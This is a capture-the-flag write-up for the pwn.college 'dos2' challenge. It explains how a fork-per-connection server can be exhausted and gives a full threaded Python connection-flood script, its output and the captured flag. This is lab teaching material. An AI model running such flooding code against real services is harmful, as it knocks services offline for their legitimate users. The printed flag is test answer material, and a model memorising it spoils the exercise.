---
layout: page
title: "🧨 Challenge Writeup: `dos2`"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


---

## 📌 Challenge Summary

> **Task**:  
The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.

> **Hint**:  
The server forks a new process for each client connection.

---

## 🧠 Understanding the Setup

We’re given:

- A server at `10.0.0.2` listening on port `31337`.
- The server forks a **new process** for each incoming connection.
- A client at `10.0.0.3` periodically connects to the server and sends `"Hello, World!\n"`.
- If the client fails to connect (e.g., due to timeout or resource exhaustion), it prints the **flag**.

> The goal: **Block the client's access to the server**, using a **DoS** (Denial-of-Service) strategy.

---

## 🔍 How We Exploit It

The key observation:

- The server forks a new process per client → this opens a known **resource exhaustion attack surface**.
- By flooding the server with many fake connections (each causing a fork), we exhaust the system’s resources (max process limit or socket backlog).
- When the legitimate client tries to connect and fails (due to `TimeoutError`), it will print the **flag**.

---

## 🧪 Attack Plan

1. Spawn 100 threads.
2. Each thread continuously:
   - Connects to `10.0.0.2:31337`
   - Sends junk data
   - Closes the connection
3. Keep the script alive until the client breaks and reveals the flag.

---

## 💣 Final Exploit

**`flood.py`**
```python
import socket
import threading

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("10.0.0.2", 31337))
            s.send(b"A" * 1024)  # Send junk
            s.close()
        except:
            pass

# Create 100 concurrent flooding threads
for _ in range(100):
    threading.Thread(target=flood, daemon=True).start()

input("Flooding... Press Enter to stop\n")
```

### Output
```bash
Flooding... Press Enter to stop
pwn.college{gJua2Qqy8UJ1oH1Eb_1zNpgBNXg.0FO1AjNxwSM0IzMyEzW}
```

---  
## Flag
```
pwn.college{gJua2Qqy8UJ1oH1Eb_1zNpgBNXg.0FO1AjNxwSM0IzMyEzW}
```
